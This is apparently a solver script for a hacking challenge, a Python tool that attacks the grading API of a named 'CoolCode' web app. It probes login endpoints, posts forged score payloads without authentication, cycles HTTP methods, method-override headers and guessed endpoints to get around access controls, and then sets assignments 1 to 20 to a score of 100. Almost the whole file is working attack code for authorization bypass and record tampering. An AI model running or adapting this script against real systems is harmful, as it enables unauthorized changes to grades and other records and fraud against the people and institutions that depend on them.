#!/usr/bin/env python3
"""
CoolCode Challenge - Targeted Score Hacker
Based on the exact challenge requirements
"""

import requests
import json
import time
from urllib.parse import urljoin

class CoolCodeChallenge:
    def __init__(self):
        self.base_url = "https://coolcode-hacker-34c5455cd908.herokuapp.com"
        self.ui_url = f"{self.base_url}/ui"
        self.api_url = f"{self.base_url}/api"
        self.score_api = f"{self.base_url}/api/api/assignment/score"
        
        # Your credentials from the challenge
        self.username = "CX8de3ce71-3cbTY"
        self.password = None  # We'll need to get this
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin'
        })
    
    def log(self, message, level="INFO"):
        colors = {
            "INFO": "\033[94m",
            "SUCCESS": "\033[92m", 
            "WARNING": "\033[93m",
            "ERROR": "\033[91m",
            "HACK": "\033[95m",
            "RESET": "\033[0m"
        }
        color = colors.get(level, colors["INFO"])
        reset = colors["RESET"]
        timestamp = time.strftime("%H:%M:%S")
        print(f"{color}[{timestamp}] {level}: {message}{reset}")
    
    def step_1_register_challenge_server(self):
        """Step 1: Register with the challenge server"""
        self.log("🚀 Step 1: Registering with challenge server", "INFO")
        
        register_url = f"{self.base_url}/api/coolcodehackteam/{self.username}"
        
        try:
            response = self.session.get(register_url)
            self.log(f"Registration response: {response.status_code}", "INFO")
            if response.text:
                self.log(f"Response: {response.text[:200]}", "INFO")
                
            if response.status_code == 200:
                self.log("✅ Successfully registered with challenge server!", "SUCCESS")
                return True
            else:
                self.log("⚠️ Registration may have failed, but continuing...", "WARNING")
                return False
                
        except Exception as e:
            self.log(f"Registration failed: {e}", "ERROR")
            return False
    
    def step_2_explore_ui(self):
        """Step 2: Explore the CoolCode UI to understand the system"""
        self.log("🔍 Step 2: Exploring CoolCode UI", "INFO")
        
        try:
            # First, visit the UI homepage
            response = self.session.get(self.ui_url)
            self.log(f"UI homepage: {response.status_code}", "INFO")
            
            # Look for login page
            login_endpoints = [
                f"{self.ui_url}/login",
                f"{self.base_url}/login",
                f"{self.api_url}/login",
                f"{self.api_url}/auth/login"
            ]
            
            for endpoint in login_endpoints:
                try:
                    response = self.session.get(endpoint)
                    self.log(f"Login endpoint {endpoint}: {response.status_code}", "INFO")
                    if response.status_code == 200:
                        self.log(f"✅ Found login endpoint: {endpoint}", "SUCCESS")
                        return endpoint
                except:
                    continue
                    
            return None
            
        except Exception as e:
            self.log(f"UI exploration failed: {e}", "ERROR")
            return None
    
    def step_3_test_score_api_direct(self):
        """Step 3: Test the score API directly (without auth)"""
        self.log("🎯 Step 3: Testing score API directly", "HACK")
        
        # Test payload - trying to set your own score to 100
        test_payload = {
            "username": self.username,
            "assignmentId": 1,
            "score": 100
        }
        
        self.log(f"Testing with payload: {json.dumps(test_payload)}", "INFO")
        
        try:
            response = self.session.post(
                self.score_api,
                json=test_payload,
                headers={
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                }
            )
            
            self.log(f"Direct API test: {response.status_code}", "INFO")
            self.log(f"Response: {response.text}", "INFO")
            
            if response.status_code == 200:
                self.log("🚨 VULNERABILITY: API accessible without authentication!", "SUCCESS")
                return True
            elif response.status_code == 405:
                self.log("405 Method Not Allowed - need to try different approaches", "WARNING")
                return False
            elif response.status_code == 401:
                self.log("401 Unauthorized - authentication required", "WARNING")
                return False
            elif response.status_code == 403:
                self.log("403 Forbidden - access denied", "WARNING")
                return False
            else:
                self.log(f"Unexpected response: {response.status_code}", "WARNING")
                return False
                
        except Exception as e:
            self.log(f"Direct API test failed: {e}", "ERROR")
            return False
    
    def step_4_try_method_variations(self):
        """Step 4: Try different HTTP methods and headers"""
        self.log("🔧 Step 4: Trying method variations for 405 bypass", "HACK")
        
        test_payload = {
            "username": self.username,
            "assignmentId": 1,
            "score": 100
        }
        
        # Different HTTP methods to try
        methods_to_try = [
            ("PUT", {"Content-Type": "application/json"}),
            ("PATCH", {"Content-Type": "application/json"}),
            ("POST", {"Content-Type": "application/x-www-form-urlencoded"}),
            ("GET", {}),  # Query parameters
            ("POST", {"X-HTTP-Method-Override": "PUT", "Content-Type": "application/json"}),
            ("GET", {"X-HTTP-Method-Override": "POST"}),
        ]
        
        for method, headers in methods_to_try:
            try:
                self.log(f"Trying {method} with headers: {headers}", "INFO")
                
                if method == "GET":
                    # For GET, use query parameters
                    params = {
                        "username": test_payload["username"],
                        "assignmentId": test_payload["assignmentId"], 
                        "score": test_payload["score"]
                    }
                    response = self.session.get(self.score_api, params=params, headers=headers)
                elif headers.get("Content-Type") == "application/x-www-form-urlencoded":
                    # For form data
                    data = {
                        "username": test_payload["username"],
                        "assignmentId": str(test_payload["assignmentId"]),
                        "score": str(test_payload["score"])
                    }
                    response = getattr(self.session, method.lower())(
                        self.score_api, data=data, headers=headers
                    )
                else:
                    # For JSON
                    response = getattr(self.session, method.lower())(
                        self.score_api, json=test_payload, headers=headers
                    )
                
                self.log(f"{method}: {response.status_code} - {response.text[:100]}", "INFO")
                
                if response.status_code == 200:
                    self.log(f"🎉 SUCCESS with {method}!", "SUCCESS")
                    return True, method, headers
                    
            except Exception as e:
                self.log(f"{method} failed: {e}", "ERROR")
        
        return False, None, None
    
    def step_5_try_different_endpoints(self):
        """Step 5: Try different endpoint variations"""
        self.log("🎯 Step 5: Trying different endpoint variations", "HACK")
        
        endpoint_variations = [
            "/api/assignment/score",
            "/api/score", 
            "/assignment/score",
            "/score",
            "/api/assignments/score",
            "/api/api/assignments/score",
            "/api/api/assignment/scores",
            "/api/assignment/update",
            "/api/api/assignment/update",
            "/api/student/score",
            "/api/grade",
            "/api/api/grade"
        ]
        
        test_payload = {
            "username": self.username,
            "assignmentId": 1,
            "score": 100
        }
        
        for endpoint in endpoint_variations:
            full_url = self.base_url + endpoint
            try:
                self.log(f"Testing endpoint: {endpoint}", "INFO")
                
                response = self.session.post(
                    full_url,
                    json=test_payload,
                    headers={'Content-Type': 'application/json'}
                )
                
                self.log(f"{endpoint}: {response.status_code}", "INFO")
                
                if response.status_code == 200:
                    self.log(f"🎉 SUCCESS with endpoint {endpoint}!", "SUCCESS")
                    return True, endpoint
                elif response.status_code != 404:
                    self.log(f"Interesting response from {endpoint}: {response.status_code}", "WARNING")
                    
            except Exception as e:
                self.log(f"Endpoint {endpoint} failed: {e}", "ERROR")
        
        return False, None
    
    def step_6_exploit_all_assignments(self, working_method=None, working_headers=None, working_endpoint=None):
        """Step 6: If we found a working method, exploit all assignments"""
        self.log("🚀 Step 6: Exploiting all assignments", "HACK")
        
        if not working_method:
            working_method = "POST"
        if not working_headers:
            working_headers = {"Content-Type": "application/json"}
        if not working_endpoint:
            working_endpoint = self.score_api
        else:
            working_endpoint = self.base_url + working_endpoint
        
        self.log(f"Using method: {working_method}, endpoint: {working_endpoint}", "INFO")
        
        successful_assignments = []
        
        # Try assignments 1-20
        for assignment_id in range(1, 21):
            payload = {
                "username": self.username,
                "assignmentId": assignment_id,
                "score": 100
            }
            
            try:
                if working_method == "GET":
                    response = self.session.get(working_endpoint, params=payload, headers=working_headers)
                elif working_headers.get("Content-Type") == "application/x-www-form-urlencoded":
                    data = {k: str(v) for k, v in payload.items()}
                    response = getattr(self.session, working_method.lower())(
                        working_endpoint, data=data, headers=working_headers
                    )
                else:
                    response = getattr(self.session, working_method.lower())(
                        working_endpoint, json=payload, headers=working_headers
                    )
                
                if response.status_code == 200:
                    self.log(f"✅ Assignment {assignment_id}: SUCCESS", "SUCCESS")
                    successful_assignments.append(assignment_id)
                else:
                    self.log(f"❌ Assignment {assignment_id}: {response.status_code}", "ERROR")
                
                # Small delay to avoid rate limiting
                time.sleep(0.1)
                
            except Exception as e:
                self.log(f"Assignment {assignment_id} failed: {e}", "ERROR")
        
        self.log(f"🎯 Successfully hacked {len(successful_assignments)} assignments!", "SUCCESS")
        if successful_assignments:
            self.log(f"Successful assignments: {successful_assignments}", "SUCCESS")
        
        return successful_assignments
    
    def run_full_challenge(self):
        """Run the complete challenge"""
        self.log("🔥 Starting CoolCode Challenge Hack", "HACK")
        self.log("=" * 60, "INFO")
        
        # Step 1: Register with challenge server
        self.step_1_register_challenge_server()
        
        # Step 2: Explore UI
        login_endpoint = self.step_2_explore_ui()
        
        # Step 3: Test direct API access
        direct_success = self.step_3_test_score_api_direct()
        
        if direct_success:
            # If direct access works, exploit all assignments
            successful = self.step_6_exploit_all_assignments()
            if successful:
                self.log("🎉 CHALLENGE COMPLETED! All scores hacked!", "SUCCESS")
                return True
        
        # Step 4: Try method variations
        method_success, working_method, working_headers = self.step_4_try_method_variations()
        
        if method_success:
            successful = self.step_6_exploit_all_assignments(working_method, working_headers)
            if successful:
                self.log("🎉 CHALLENGE COMPLETED! All scores hacked!", "SUCCESS")
                return True
        
        # Step 5: Try different endpoints
        endpoint_success, working_endpoint = self.step_5_try_different_endpoints()
        
        if endpoint_success:
            successful = self.step_6_exploit_all_assignments(
                working_endpoint=working_endpoint
            )
            if successful:
                self.log("🎉 CHALLENGE COMPLETED! All scores hacked!", "SUCCESS")
                return True
        
        self.log("❌ Challenge failed - need manual investigation", "ERROR")
        self.log("💡 Try using browser dev tools to intercept requests", "WARNING")
        return False

def main():
    print("🔥" * 25)
    print("   CoolCode Challenge Hacker")
    print("   Target: Help your peer get full scores")
    print("🔥" * 25)
    print()
    
    challenge = CoolCodeChallenge()
    
    print(f"🎯 Your username: {challenge.username}")
    print(f"🌐 Target API: {challenge.score_api}")
    print(f"📋 Goal: Override assignment scores to 100")
    print()
    
    success = challenge.run_full_challenge()
    
    if success:
        print("\n🎉 CONGRATULATIONS! Challenge completed successfully!")
        print("💯 Your peer should now have full scores on all assignments!")
        print("🏆 You've earned 60% of the challenge points!")
    else:
        print("\n❌ Automated approach failed.")
        print("💡 Next steps:")
        print("   1. Open browser and go to: https://coolcode-hacker-34c5455cd908.herokuapp.com/ui")
        print("   2. Login with your credentials")
        print("   3. Open browser dev tools (F12)")
        print("   4. Look for API calls when submitting assignments")
        print("   5. Copy the working request format and headers")

if __name__ == "__main__":
    main()
